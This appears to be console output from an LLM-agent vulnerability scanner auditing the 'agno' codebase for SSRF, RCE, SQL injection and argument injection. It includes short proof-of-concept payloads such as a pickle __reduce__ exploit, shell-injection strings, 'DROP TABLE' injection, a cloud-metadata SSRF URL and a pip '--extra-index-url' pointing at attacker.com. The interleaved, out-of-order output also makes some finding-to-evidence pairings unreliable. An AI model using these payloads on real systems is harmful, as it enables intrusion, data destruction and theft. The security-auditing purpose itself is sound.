[1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m
+[?25h[1A[2K    Remote Code Execution: [1;36m18[0m [1;35msink[0m[1m([0ms[1m)[0m
+    Local File Inclusion: [1;36m39[0m [1;35msink[0m[1m([0ms[1m)[0m
+    Server-Side Request Forgery: [1;36m40[0m [1;35msink[0m[1m([0ms[1m)[0m
+    SQL Injection: [1;36m58[0m [1;35msink[0m[1m([0ms[1m)[0m
+    ReDoS [1m([0mRegular Expression DoS[1m)[0m: [1;36m20[0m [1;35msink[0m[1m([0ms[1m)[0m
+    XML External Entity [1m([0mXXE[1m)[0m — XML parser with insecure defaults: [1;36m2[0m [1;35msink[0m[1m([0ms[1m)[0m
+    Server-Side Template Injection [1m([0mSSTI[1m)[0m — template engine with user input: [1;36m2[0m 
+[1;35msink[0m[1m([0ms[1m)[0m
+    Suspicious — requires analysis [1m([0mpath constructor [35m/[0m logic pattern[1m)[0m: [1;36m18[0m 
+[1;35msink[0m[1m([0ms[1m)[0m
+
+[1mPhase B: Slice Sorting [0m[1m([0m[1;36m197[0m[1m raw paths[0m[1m)[0m
+  [2mBody-detected orphans: [0m[1;2;36m36[0m[2m [0m[1;2m([0m[2mno call chain[0m[1;2m)[0m
+  Exploit: [1;36m30[0m + Explore: [1;36m15[0m
+    [2mExplore: sqli-[0m[1;2;36m000[0m[2m _execute [0m[2;33mscore[0m[2m=[0m[1;2;36m0[0m[1;2;36m.65[0m[2m [0m[1;2m([0m[2mnon_std_sink, unusual_naming[0m[1;2m)[0m
+    [2mExplore: sqli-[0m[1;2;36m001[0m[2m execute_stream [0m[2;33mscore[0m[2m=[0m[1;2;36m0[0m[1;2;36m.65[0m[2m [0m[1;2m([0m[2mnon_std_sink, unusual_naming[0m[1;2m)[0m
+    [2mExplore: sqli-[0m[1;2;36m002[0m[2m aexecute [0m[2;33mscore[0m[2m=[0m[1;2;36m0[0m[1;2;36m.65[0m[2m [0m[1;2m([0m[2mnon_std_sink, unusual_naming[0m[1;2m)[0m
+  [36mProject type: app[0m
+
+[1mPhase C: README Understanding[0m
+  [2mNo README found.[0m
+  [1;2m([0m[2mskipped[0m[1;2m)[0m
+
+[1mPhase D: Intent+Logic Agents [0m[1m([0m[1;36m45[0m[1m slices[0m[1m)[0m
+  [1m[[0m[1;36m1[0m/[1;36m45[0m[1m][0m lfi-[1;36m000[0m [1m([0mfile[1m)[0m
+  [1m[[0m[1;36m2[0m/[1;36m45[0m[1m][0m rce-[1;36m001[0m [1m([0mvalidate_cel_expression[1m)[0m
+  [1m[[0m[1;36m3[0m/[1;36m45[0m[1m][0m redos-[1;36m002[0m [1m([0mvalidate_phone_number[1m)[0m
+  [1m[[0m[1;36m4[0m/[1;36m45[0m[1m][0m sqli-[1;36m003[0m [1m([0mexecute[1m)[0m
+  [1m[[0m[1;36m5[0m/[1;36m45[0m[1m][0m ssrf-[1;36m004[0m [1m([0mfile_url_content[1m)[0m
+  [1m[[0m[1;36m8[0m/[1;36m45[0m[1m][0m xxe-[1;36m007[0m [1m([0mfetch_pubmed_ids[1m)[0m
+  [1m[[0m[1;36m7[0m/[1;36m45[0m[1m][0m suspicious-[1;36m006[0m [1m([0m_has_windows_path_prefix[1m)[0m
+  [1m[[0m[1;36m6[0m/[1;36m45[0m[1m][0m ssti-[1;36m005[0m [1m([0m_format_message_with_state_variables[1m)[0m
+    [31m⚠ [0m[1;31m9[0m[31m/[0m[1;31m10[0m[31m — [0m[1;31m1[0m[31m [0m[1;31mcontradiction[0m[1;31m([0m[31ms[0m[1;31m)[0m
+    Adversary: ssrf-[1;36m004[0m[33m...[0m
+    [2m✓ [0m[1;2;36m1[0m[2m/[0m[1;2;36m10[0m[2m — safe[0m
+    Evidence: rce-[1;36m001[0m[33m...[0m
+    [32m✓ not rebutted[0m
+      weak point: The function file_url_content directly uses self.url in 
+httpx.get without any validation, allowlisting, or redirect handling. The URL is
+likely user-controlled via class attributes, and the code lacks any SSRF 
+defenses. The static analysis confirms the taint path from entry to sink, and 
+the developer intent is empty, indicating no security considerations. This is a 
+classic SSRF vulnerability.
+    PoC Agent: ssrf-[1;36m004[0m[33m...[0m
+    [33m? [0m[1;33m10[0m[33m/[0m[1;33m10[0m[33m — interesting[0m
+    Evidence: xxe-[1;36m007[0m[33m...[0m
+  [1m[[0m[1;36m9[0m/[1;36m45[0m[1m][0m sqli-[1;36m008[0m [1m([0mvalidate_human_review_for_parallel[1m)[0m
+    [33m? [0m[1;33m10[0m[33m/[0m[1;33m10[0m[33m — interesting[0m
+    Evidence: redos-[1;36m002[0m[33m...[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m7[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+  [1m[[0m[1;36m10[0m/[1;36m45[0m[1m][0m redos-[1;36m009[0m [1m([0mvalidate_email[1m)[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m1[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+  [1m[[0m[1;36m11[0m/[1;36m45[0m[1m][0m rce-[1;36m010[0m [1m([0munpickle_object_from_file[1m)[0m
+    [2m✓ [0m[1;2;36m0[0m[2m/[0m[1;2;36m10[0m[2m — safe[0m
+    Evidence: lfi-[1;36m000[0m[33m...[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m3[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+  [1m[[0m[1;36m12[0m/[1;36m45[0m[1m][0m rce-[1;36m011[0m [1m([0mrun_shell_command[1m)[0m
+    [33m? [0m[1;33m10[0m[33m/[0m[1;33m10[0m[33m — interesting[0m
+    Evidence: redos-[1;36m009[0m[33m...[0m
+    [33m? [0m[1;33m10[0m[33m/[0m[1;33m10[0m[33m — interesting[0m
+    Evidence: suspicious-[1;36m006[0m[33m...[0m
+  [1m[[0m[1;36m13[0m/[1;36m45[0m[1m][0m rce-[1;36m012[0m [1m([0mrun_python_code[1m)[0m
+    [31m⚠ [0m[1;31m10[0m[31m/[0m[1;31m10[0m[31m — [0m[1;31m1[0m[31m [0m[1;31mcontradiction[0m[1;31m([0m[31ms[0m[1;31m)[0m
+    Adversary: rce-[1;36m010[0m[33m...[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m1[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+  [1m[[0m[1;36m14[0m/[1;36m45[0m[1m][0m rce-[1;36m013[0m [1m([0mrun_shell_command[1m)[0m
+    [32m✓ not rebutted[0m
+      weak point: The function is a public API with no input validation or 
+sanitization. [1;35mpickle.load[0m[1m([0m[1m)[0m is inherently unsafe and allows arbitrary code 
+execution. The verify_class check occurs after deserialization, so it does not 
+prevent RCE. The file_path parameter is attacker-controllable, making 
+exploitation straightforward.
+    PoC Agent: rce-[1;36m010[0m[33m...[0m
+    [33m? [0m[1;33m9[0m[33m/[0m[1;33m10[0m[33m — interesting[0m
+    Evidence: ssti-[1;36m005[0m[33m...[0m
+  [1m[[0m[1;36m15[0m/[1;36m45[0m[1m][0m rce-[1;36m014[0m [1m([0mcreate_file[1m)[0m
+    [2m✓ [0m[1;2;36m0[0m[2m/[0m[1;2;36m10[0m[2m — safe[0m
+    Evidence: sqli-[1;36m008[0m[33m...[0m
+    [32m📄 PoC: [0m
+[32m/home/xcy/workSpace/code-agies/pocs/agno/[0m[32mssrf_function_url_content_uses_file_url[0m
+[32m_content.py[0m
+    Evidence: ssrf-[1;36m004[0m[33m...[0m
+    [33m? [0m[1;33m9[0m[33m/[0m[1;33m10[0m[33m — interesting[0m
+    Evidence: sqli-[1;36m003[0m[33m...[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m1[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+  [1m[[0m[1;36m16[0m/[1;36m45[0m[1m][0m rce-[1;36m015[0m [1m([0mlist_files[1m)[0m
+    [31m⚠ [0m[1;31m10[0m[31m/[0m[1;31m10[0m[31m — [0m[1;31m1[0m[31m [0m[1;31mcontradiction[0m[1;31m([0m[31ms[0m[1;31m)[0m
+    Adversary: rce-[1;36m011[0m[33m...[0m
+    [32m✓ evidence found [0m[1;32m([0m[1;32m3[0m[32m [0m[1;32mmatch[0m[1;32m([0m[32mes[0m[1;32m)[0m[1;32m)[0m
+      PoC: Set self.url to [32m'http://169.254.169.254/latest/meta-data/'[0m and call 
+[1;35mfile_url_content[0m[1m([0m[1m)[0m. The response will contain cloud metadata[33m...[0m.
+    Verifying ssrf-[1;36m004[0m[33m...[0m
+    [31m⚠ [0m[1;31m10[0m[31m/[0m[1;31m10[0m[31m — [0m[1;31m1[0m[31m [0m[1;31mcontradiction[0m[1;31m([0m[31ms[0m[1;31m)[0m
+    Adversary: rce-[1;36m012[0m[33m...[0m
+    [32m✓ not rebutted[0m
+      weak point: The finding is straightforward: user input flows directly into
+a shell command without sanitization, and the sink uses subprocess.run with a 
+string argument [1m([0m[33mshell[0m=[3;92mTrue[0m by default[1m)[0m. No validation or access control is 
+present. The code is clearly exploitable.
+    PoC Agent: rce-[1;36m011[0m[33m...[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m9[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+  [1m[[0m[1;36m17[0m/[1;36m45[0m[1m][0m rce-[1;36m016[0m [1m([0mdelete_file[1m)[0m
+    [32m✓ verification confirmed[0m
+  [1m[[0m[1;36m18[0m/[1;36m45[0m[1m][0m redos-[1;36m017[0m [1m([0m_clean_json_content[1m)[0m
+    [32m✓ not rebutted[0m
+      weak point: The function directly calls [1;35mexec[0m[1m([0m[1m)[0m on the [32m'code'[0m parameter 
+without any sanitization or sandboxing. Even if safe_globals and safe_locals are
+restricted, [1;35mexec[0m[1m([0m[1m)[0m can still execute arbitrary code via builtins like __import__
+or os.system. The developer intent does not mention security measures, and the 
+code is a public API that could be called with attacker-controlled input.
+    PoC Agent: rce-[1;36m012[0m[33m...[0m
+    [33m? [0m[1;33m10[0m[33m/[0m[1;33m10[0m[33m — interesting[0m
+    Evidence: rce-[1;36m014[0m[33m...[0m
+    [31m⚠ [0m[1;31m10[0m[31m/[0m[1;31m10[0m[31m — [0m[1;31m1[0m[31m [0m[1;31mcontradiction[0m[1;31m([0m[31ms[0m[1;31m)[0m
+    Adversary: rce-[1;36m013[0m[33m...[0m
+    [32m✓ not rebutted[0m
+      weak point: The sink uses subprocess.run with a string argument, which 
+implies [33mshell[0m=[3;92mTrue[0m, and the input is directly interpolated into the command 
+string without sanitization. The data flow is clear: directory parameter enters 
+change_directory and is passed to run_shell_command. No input validation or 
+access control is present. Exploitation is straightforward via shell 
+metacharacters.
+    PoC Agent: rce-[1;36m013[0m[33m...[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m6[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+  [1m[[0m[1;36m19[0m/[1;36m45[0m[1m][0m sqli-[1;36m018[0m [1m([0mmigrate_pgvector_table[1m)[0m
+    [33m? [0m[1;33m10[0m[33m/[0m[1;33m10[0m[33m — interesting[0m
+    Evidence: rce-[1;36m016[0m[33m...[0m
+    [31m⚠ [0m[1;31m8[0m[31m/[0m[1;31m10[0m[31m — [0m[1;31m1[0m[31m [0m[1;31mcontradiction[0m[1;31m([0m[31ms[0m[1;31m)[0m
+    Adversary: rce-[1;36m015[0m[33m...[0m
+    [32m📄 PoC: [0m
+[32m/home/xcy/workSpace/code-agies/pocs/agno/[0m[32mrce_function_unpickle_object_uses_unpic[0m
+[32mkle_object_from_file.py[0m
+    Evidence: rce-[1;36m010[0m[33m...[0m
+    [32m✓ not rebutted[0m
+      weak point: The finding relies on the assumption that 
+[1;35mcurrent_sandbox.process.exec[0m[1m([0m[1m)[0m uses [33mshell[0m=[3;92mTrue[0m, which is common but not 
+confirmed. Additionally, [1;35mshlex.quote[0m[1m([0m[1m)[0m can be bypassed with newlines, but 
+exploitation requires the sandbox to not sanitize further. The data flow is 
+plausible but not fully verified.
+    PoC Agent: rce-[1;36m015[0m[33m...[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m6[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+  [1m[[0m[1;36m20[0m/[1;36m45[0m[1m][0m sqli-[1;36m019[0m [1m([0mmigrate_singlestore_table[1m)[0m
+    [32m✓ evidence found [0m[1;32m([0m[1;32m7[0m[32m [0m[1;32mmatch[0m[1;32m([0m[32mes[0m[1;32m)[0m[1;32m)[0m
+      PoC: import pickle
+import os
+
+class Exploit:
+    def [1;35m__reduce__[0m[1m([0mself[1m)[0m:
+        return [1m([0mos.system, [1m([0m[32m'echo pwned'[0m,[1m)[0m[1m)[0m
+
+# Create malicious pickle file
+with ope[33m...[0m
+    Verifying rce-[1;36m010[0m[33m...[0m
+    [32m📄 PoC: [0m
+[32m/home/xcy/workSpace/code-agies/pocs/agno/[0m[32mrce_python_code_leading_rce_run_python_[0m
+[32mcode.py[0m
+    Evidence: rce-[1;36m012[0m[33m...[0m
+    [32m📄 PoC: [0m
+[32m/home/xcy/workSpace/code-agies/pocs/agno/[0m[32mrce_run_shell_command_function_run_shel[0m
+[32ml_command.py[0m
+    Evidence: rce-[1;36m011[0m[33m...[0m
+    [32m✓ verification confirmed[0m
+  [1m[[0m[1;36m21[0m/[1;36m45[0m[1m][0m rce-[1;36m020[0m [1m([0mrun_shell_command[1m)[0m
+    [32m✓ evidence found [0m[1;32m([0m[1;32m8[0m[32m [0m[1;32mmatch[0m[1;32m([0m[32mes[0m[1;32m)[0m[1;32m)[0m
+      PoC: [1;35mexec[0m[1m([0m[32m"import os; os.system[0m[32m([0m[32m'id'[0m[32m)[0m[32m"[0m[1m)[0m[33m...[0m
+    Verifying rce-[1;36m012[0m[33m...[0m
+    [32m✓ evidence found [0m[1;32m([0m[1;32m7[0m[32m [0m[1;32mmatch[0m[1;32m([0m[32mes[0m[1;32m)[0m[1;32m)[0m
+      PoC: directory = [32m'; id'[0m or directory = [32m'$[0m[32m([0m[32mid[0m[32m)[0m[32m'[0m or directory = [32m'`id`'[0m[33m...[0m
+    Verifying rce-[1;36m011[0m[33m...[0m
+    [31m⚠ [0m[1;31m10[0m[31m/[0m[1;31m10[0m[31m — [0m[1;31m1[0m[31m [0m[1;31mcontradiction[0m[1;31m([0m[31ms[0m[1;31m)[0m
+    Adversary: sqli-[1;36m018[0m[33m...[0m
+    [32m✓ verification confirmed[0m
+  [1m[[0m[1;36m22[0m/[1;36m45[0m[1m][0m rce-[1;36m021[0m [1m([0mrun_command[1m)[0m
+    [32m✓ verification confirmed[0m
+  [1m[[0m[1;36m23[0m/[1;36m45[0m[1m][0m rce-[1;36m022[0m [1m([0mpip_install_package[1m)[0m
+    [32m✓ not rebutted[0m
+      weak point: The function is a public API [1m([0mreachable from external code[1m)[0m 
+and directly interpolates user-controlled table_name and schema into SQL queries
+via f-strings without any sanitization or safe identifier quoting. An attacker 
+can break out of double-quoted identifiers by including a double quote in the 
+input, leading to SQL injection. No input validation or parameterization is 
+present.
+    PoC Agent: sqli-[1;36m018[0m[33m...[0m
+    [31m⚠ [0m[1;31m10[0m[31m/[0m[1;31m10[0m[31m — [0m[1;31m1[0m[31m [0m[1;31mcontradiction[0m[1;31m([0m[31ms[0m[1;31m)[0m
+    Adversary: sqli-[1;36m019[0m[33m...[0m
+    [32m📄 PoC: [0m
+[32m/home/xcy/workSpace/code-agies/pocs/agno/[0m[32mrce_run_shell_command_function_run_shel[0m
+[32ml_command_2.py[0m
+    Evidence: rce-[1;36m013[0m[33m...[0m
+    [32m✓ not rebutted[0m
+      weak point: The function is a public API with no input validation or 
+parameterization. The f-string interpolation of user-controlled table_name and 
+schema directly into SQL ALTER TABLE statements is a classic SQL injection 
+pattern. The data flow is clear: external callers control these parameters, and 
+they reach the sink without sanitization. Exploitation is practical as an 
+attacker can inject arbitrary SQL via backtick escaping or other techniques.
+    PoC Agent: sqli-[1;36m019[0m[33m...[0m
+    [32m📄 PoC: [0m
+[32m/home/xcy/workSpace/code-agies/pocs/agno/[0m[32mrce_additionally_command_executed_curre[0m
+[32mnt_list_files.py[0m
+    Evidence: rce-[1;36m015[0m[33m...[0m
+    [31m⚠ [0m[1;31m10[0m[31m/[0m[1;31m10[0m[31m — [0m[1;31m1[0m[31m [0m[1;31mcontradiction[0m[1;31m([0m[31ms[0m[1;31m)[0m
+    Adversary: rce-[1;36m020[0m[33m...[0m
+    [32m✓ evidence found [0m[1;32m([0m[1;32m7[0m[32m [0m[1;32mmatch[0m[1;32m([0m[32mes[0m[1;32m)[0m[1;32m)[0m
+      PoC: directory = [32m'; echo pwned > /tmp/pwned'[0m[33m...[0m
+    Verifying rce-[1;36m013[0m[33m...[0m
+    [2m✓ [0m[1;2;36m0[0m[2m/[0m[1;2;36m10[0m[2m — safe[0m
+    Evidence: redos-[1;36m017[0m[33m...[0m
+    [32m✓ not rebutted[0m
+      weak point: The finding is straightforward: user-controlled [32m'directory'[0m 
+flows into an f-string passed to subprocess.run with [33mshell[0m=[3;92mTrue[0m, enabling 
+command injection. No input validation or sanitization is present. The code path
+is reachable via the public API of the tool.
+    PoC Agent: rce-[1;36m020[0m[33m...[0m
+    [32m✓ verification confirmed[0m
+  [1m[[0m[1;36m24[0m/[1;36m45[0m[1m][0m rce-[1;36m023[0m [1m([0muv_pip_install_package[1m)[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m8[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+  [1m[[0m[1;36m25[0m/[1;36m45[0m[1m][0m rce-[1;36m024[0m [1m([0mrun_shell[1m)[0m
+    [31m⚠ [0m[1;31m9[0m[31m/[0m[1;31m10[0m[31m — [0m[1;31m1[0m[31m [0m[1;31mcontradiction[0m[1;31m([0m[31ms[0m[1;31m)[0m
+    Adversary: rce-[1;36m022[0m[33m...[0m
+    [32m✓ not rebutted[0m
+      weak point: The function passes package_name directly to pip install 
+without validation. Pip interprets arguments starting with [32m'--'[0m as options, 
+allowing an attacker to inject options like --extra-index-url to redirect 
+package installation to a malicious server, leading to arbitrary code execution.
+The developer intent does not mention input sanitization, and the code lacks any
+checks.
+    PoC Agent: rce-[1;36m022[0m[33m...[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m3[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+  [1m[[0m[1;36m26[0m/[1;36m45[0m[1m][0m rce-[1;36m025[0m [1m([0mgrep[1m)[0m
+    [31m⚠ [0m[1;31m10[0m[31m/[0m[1;31m10[0m[31m — [0m[1;31m1[0m[31m [0m[1;31mcontradiction[0m[1;31m([0m[31ms[0m[1;31m)[0m
+    Adversary: rce-[1;36m021[0m[33m...[0m
+    [31m⚠ [0m[1;31m9[0m[31m/[0m[1;31m10[0m[31m — [0m[1;31m1[0m[31m [0m[1;31mcontradiction[0m[1;31m([0m[31ms[0m[1;31m)[0m
+    Adversary: rce-[1;36m024[0m[33m...[0m
+    [31m⚠ [0m[1;31m9[0m[31m/[0m[1;31m10[0m[31m — [0m[1;31m1[0m[31m [0m[1;31mcontradiction[0m[1;31m([0m[31ms[0m[1;31m)[0m
+    Adversary: rce-[1;36m023[0m[33m...[0m
+    [32m📄 PoC: [0m
+[32m/home/xcy/workSpace/code-agies/pocs/agno/[0m[32msqli_index_statements_without_any_migra[0m
+[32mte_pgvector_table.py[0m
+    Evidence: sqli-[1;36m018[0m[33m...[0m
+    [32m✓ not rebutted[0m
+      weak point: The function run_shell uses subprocess.run with [33mshell[0m=[3;92mTrue[0m and
+passes the command string directly. The _check_command method only checks for 
+path escapes, not shell metacharacters, so command injection is possible. The 
+function is a public API intended to execute shell commands, and the data flow 
+shows the command parameter is attacker-controlled. No effective sanitization 
+exists.
+    PoC Agent: rce-[1;36m024[0m[33m...[0m
+    [31m✗ rebutted[0m
+      reason: The finding claims RCE via command injection, but the code uses 
+`[1;35msubprocess.run[0m[1m([0margs, [33m...[0m[1m)[0m` with `[33mshell[0m=[3;91mFalse[0m` [1m([0mdefault[1m)[0m. When `args` is a 
+string, it is treated as the executable path, not a shell command. Even if the 
+string contains spaces, it will be interpreted as a single executable name, 
+likely causing a FileNotFoundError, not command injection. The developer intent 
+mismatch [1m([0mlist vs string[1m)[0m does not create an exploitable vulnerability because 
+`[33mshell[0m=[3;91mFalse[0m` prevents shell interpretation. No argument injection is possible 
+since the string is not split. The finding's speculation about future changes or
+wrappers is not a valid basis for a current vulnerability. Therefore, the 
+finding is not exploitable.
+    Evidence: rce-[1;36m021[0m[33m...[0m
+    [32m✓ not rebutted[0m
+      weak point: The function is a public API that accepts an untrusted 
+package_name parameter and passes it directly to subprocess.check_call without 
+sanitization. Argument injection is possible, and if uv or pip have options that
+allow code execution, RCE could be achieved. The developer intent summary lacks 
+security considerations, and no input validation is present.
+    PoC Agent: rce-[1;36m023[0m[33m...[0m
+    [33m? [0m[1;33m9[0m[33m/[0m[1;33m10[0m[33m — interesting[0m
+    Evidence: rce-[1;36m025[0m[33m...[0m
+    [32m📄 PoC: [0m
+[32m/home/xcy/workSpace/code-agies/pocs/agno/[0m[32mrce_run_shell_command_function_run_shel[0m
+[32ml_command_3.py[0m
+    Evidence: rce-[1;36m020[0m[33m...[0m
+    [32m✓ evidence found [0m[1;32m([0m[1;32m4[0m[32m [0m[1;32mmatch[0m[1;32m([0m[32mes[0m[1;32m)[0m[1;32m)[0m
+      PoC: Call [1;35mmigrate_pgvector_table[0m[1m([0m[33mtable_name[0m=[32m'users; DROP TABLE users; --'[0m,
+[33mschema[0m=[32m'public'[0m[1m)[0m to execute DROP TABLE users[33m...[0m.
+    Verifying sqli-[1;36m018[0m[33m...[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m8[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+  [1m[[0m[1;36m27[0m/[1;36m45[0m[1m][0m rce-[1;36m026[0m [1m([0mrun_script[1m)[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m9[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+  [1m[[0m[1;36m28[0m/[1;36m45[0m[1m][0m rce-[1;36m027[0m [1m([0m_evaluate_cel_raw[1m)[0m
+    [32m📄 PoC: [0m
+[32m/home/xcy/workSpace/code-agies/pocs/agno/[0m[32msqli_api_making_reachable_external_migr[0m
+[32mate_singlestore_table.py[0m
+    Evidence: sqli-[1;36m019[0m[33m...[0m
+    [32m✓ evidence found [0m[1;32m([0m[1;32m7[0m[32m [0m[1;32mmatch[0m[1;32m([0m[32mes[0m[1;32m)[0m[1;32m)[0m
+      PoC: directory = [32m'; echo pwned > /tmp/pwned'[0m[33m...[0m
+    Verifying rce-[1;36m020[0m[33m...[0m
+    [32m✓ verification confirmed[0m
+  [1m[[0m[1;36m29[0m/[1;36m45[0m[1m][0m rce-[1;36m028[0m [1m([0m_create_table[1m)[0m
+    [32m✓ verification confirmed[0m
+  [1m[[0m[1;36m30[0m/[1;36m45[0m[1m][0m sqli-[1;36m029[0m [1m([0mcontinue_run[1m)[0m
+    [32m✓ evidence found [0m[1;32m([0m[1;32m2[0m[32m [0m[1;32mmatch[0m[1;32m([0m[32mes[0m[1;32m)[0m[1;32m)[0m
+      PoC: Set table_name to `users; DROP TABLE users; --` and schema to 
+`public`. The resulting SQL becomes `ALTER TABLE `public`.`users; DROP TABLE 
+users; --` [33m...[0m
+    Verifying sqli-[1;36m019[0m[33m...[0m
+    [32m📄 PoC: [0m
+[32m/home/xcy/workSpace/code-agies/pocs/agno/[0m[32mrce_inject_arbitrary_commands_run_shell[0m
+[32m.py[0m
+    Evidence: rce-[1;36m024[0m[33m...[0m
+    [32m✓ verification confirmed[0m
+  [1m[[0m[1;36m31[0m/[1;36m45[0m[1m][0m sqli-[1;36m000[0m [1m([0m_execute[1m)[0m
+    [32m📄 PoC: [0m
+[32m/home/xcy/workSpace/code-agies/pocs/agno/[0m[32mrce_spec_developer_intended_install_pip[0m
+[32m_install_package.py[0m
+    Evidence: rce-[1;36m022[0m[33m...[0m
+    [2m✓ [0m[1;2;36m2[0m[2m/[0m[1;2;36m10[0m[2m — safe[0m
+    Evidence: rce-[1;36m026[0m[33m...[0m
+    [32m✓ evidence found [0m[1;32m([0m[1;32m8[0m[32m [0m[1;32mmatch[0m[1;32m([0m[32mes[0m[1;32m)[0m[1;32m)[0m
+      PoC: package_name = [32m'--extra-index-url http://attacker.com [0m
+[32mmalicious_package'[0m[33m...[0m
+    Verifying rce-[1;36m022[0m[33m...[0m
+    [32m✓ evidence found [0m[1;32m([0m[1;32m9[0m[32m [0m[1;32mmatch[0m[1;32m([0m[32mes[0m[1;32m)[0m[1;32m)[0m
+      PoC: If an attacker can call `run_shell` with a command like `[32m'ls; echo [0m
+[32mpwned'[0m`, the shell will execute both commands. For example: `[1;35mtool.run_shell[0m[1m([0m'ls;
+ec[33m...[0m
+    Verifying rce-[1;36m024[0m[33m...[0m
+    [32m✓ verification confirmed[0m
+  [1m[[0m[1;36m32[0m/[1;36m45[0m[1m][0m sqli-[1;36m001[0m [1m([0mexecute_stream[1m)[0m
+    [32m✓ verification confirmed[0m
+  [1m[[0m[1;36m33[0m/[1;36m45[0m[1m][0m sqli-[1;36m002[0m [1m([0maexecute[1m)[0m
+    [32m📄 PoC: [0m
+[32m/home/xcy/workSpace/code-agies/pocs/agno/[0m[32mrce_developer_intended_install_package_[0m
+[32muv_pip_install_package.py[0m
+    Evidence: rce-[1;36m023[0m[33m...[0m
+    [2m✓ [0m[1;2;36m0[0m[2m/[0m[1;2;36m10[0m[2m — safe[0m
+    Evidence: sqli-[1;36m029[0m[33m...[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m9[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+  [1m[[0m[1;36m34[0m/[1;36m45[0m[1m][0m sqli-[1;36m003[0m [1m([0maexecute_stream[1m)[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m1[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+  [1m[[0m[1;36m35[0m/[1;36m45[0m[1m][0m sqli-[1;36m004[0m [1m([0mexecute_stream[1m)[0m
+    [32m✓ evidence found [0m[1;32m([0m[1;32m8[0m[32m [0m[1;32mmatch[0m[1;32m([0m[32mes[0m[1;32m)[0m[1;32m)[0m
+      PoC: Call uv_pip_install_package with [33mpackage_name[0m=[32m'--help'[0m to observe 
+unintended behavior. For RCE, if uv supports --exec [1m([0mnot standard[1m)[0m, use 
+package_name[33m...[0m
+    Verifying rce-[1;36m023[0m[33m...[0m
+    [2m✓ [0m[1;2;36m2[0m[2m/[0m[1;2;36m10[0m[2m — safe[0m
+    Evidence: rce-[1;36m027[0m[33m...[0m
+    [32m✓ verification confirmed[0m
+  [1m[[0m[1;36m36[0m/[1;36m45[0m[1m][0m sqli-[1;36m005[0m [1m([0maexecute[1m)[0m
+    [33m? [0m[1;33m10[0m[33m/[0m[1;33m10[0m[33m — interesting[0m
+    Evidence: rce-[1;36m028[0m[33m...[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m7[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+  [1m[[0m[1;36m37[0m/[1;36m45[0m[1m][0m sqli-[1;36m006[0m [1m([0maexecute_stream[1m)[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m6[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+  [1m[[0m[1;36m38[0m/[1;36m45[0m[1m][0m sqli-[1;36m007[0m [1m([0mexecute_stream[1m)[0m
+    [33m? [0m[1;33m10[0m[33m/[0m[1;33m10[0m[33m — interesting[0m
+    Evidence: sqli-[1;36m000[0m[33m...[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m7[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+  [1m[[0m[1;36m39[0m/[1;36m45[0m[1m][0m redos-[1;36m008[0m [1m([0m_apply_inline_tag[1m)[0m
+    [33m? [0m[1;33m10[0m[33m/[0m[1;33m10[0m[33m — interesting[0m
+    Evidence: sqli-[1;36m001[0m[33m...[0m
+    [33m? [0m[1;33m10[0m[33m/[0m[1;33m10[0m[33m — interesting[0m
